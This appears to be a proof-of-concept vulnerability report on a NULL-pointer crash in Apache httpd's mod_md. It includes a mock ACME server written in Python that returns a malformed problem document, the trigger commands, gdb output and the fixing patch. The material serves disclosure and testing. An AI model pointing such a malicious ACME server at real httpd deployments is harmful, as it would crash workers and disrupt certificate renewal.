# PoC 169 — NULL ACME Problem `type` Dereference (mod_md)

`inspect_problem()` reads `type` from an ACME `problem+json` body and feeds
the result to `problem_status_get()`, which immediately calls
`strstr(type, "urn:ietf:params:")`. A problem document without a string
`type` makes `md_json_gets()` return `NULL` and crashes the caller.

## Setup

Module: `mod_md`. The httpd instance points at a mock ACME directory.

`/tmp/169/httpd.conf`:

```apache
ServerRoot /tmp/169
Listen 127.0.0.1:8169
PidFile  /tmp/169/httpd.pid
ErrorLog /tmp/169/error.log
LoadModule mpm_event_module    modules/mod_mpm_event.so
LoadModule unixd_module        modules/mod_unixd.so
LoadModule authz_core_module   modules/mod_authz_core.so
LoadModule watchdog_module     modules/mod_watchdog.so
LoadModule md_module           modules/mod_md.so

MDCertificateAuthority http://127.0.0.1:8170/dir
MDCertificateAgreement accepted
MDStoreDir /tmp/169/md
MDPrivateKeys RSA 2048
MDomain example.test
DocumentRoot /tmp/169/htdocs
```

### Mock ACME endpoint (`/tmp/169/acme.py`)

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
DIR = {"newNonce":"http://127.0.0.1:8170/newNonce",
       "newAccount":"http://127.0.0.1:8170/newAccount",
       "newOrder":"http://127.0.0.1:8170/newOrder"}
class H(BaseHTTPRequestHandler):
    def reply(self, code, body, ctype):
        b = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Replay-Nonce", "AAAA")
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        if self.path == "/dir":
            self.reply(200, json.dumps(DIR), "application/json")
    def do_HEAD(self):
        self.reply(200, b"", "application/json")
    def do_POST(self):
        # malformed problem: no `type`, just `detail`
        self.reply(400, json.dumps({"detail":"x"}),
                   "application/problem+json")
HTTPServer(("127.0.0.1", 8170), H).serve_forever()
```

## Trigger

```sh
python3 /tmp/169/acme.py &
httpd -X -f /tmp/169/httpd.conf &
# the watchdog drives renewal; force a poke:
curl http://127.0.0.1:8169/.well-known/acme-challenge/x
```

`mod_md` issues a `newAccount` POST, the mock replies `400` with
`Content-Type: application/problem+json` and a body of `{"detail":"x"}`,
and `inspect_problem()` runs.

## Observed effect

- The single httpd worker crashes with `SIGSEGV` inside
  `problem_status_get()` at `modules/md/md_acme.c:76`.

- `gdb` shows:

  ```text
  #0 __strstr_avx2 ()
  #1 problem_status_get (type=0x0) at modules/md/md_acme.c:76
  #2 inspect_problem ()                modules/md/md_acme.c:187
  #3 on_response ()                    modules/md/md_acme.c:320
  ```

- `error.log` records the abnormal termination of the worker; with the
  event MPM the watchdog thread crash brings the renewal job down.

- A body of `{}` or `{"type": 42}` (non-string `type`) reproduces
  identically: `md_json_gets()` returns `NULL` for both.

After the patch (`req->rv = ptype ? problem_status_get(ptype) : APR_EGENERAL;`)
the same response yields a clean `APR_EGENERAL` and the renewal job logs the
problem and continues without dereferencing `NULL`.

## Cleanup

```sh
pkill -f /tmp/169/acme.py
kill $(cat /tmp/169/httpd.pid) 2>/dev/null
rm -rf /tmp/169
```
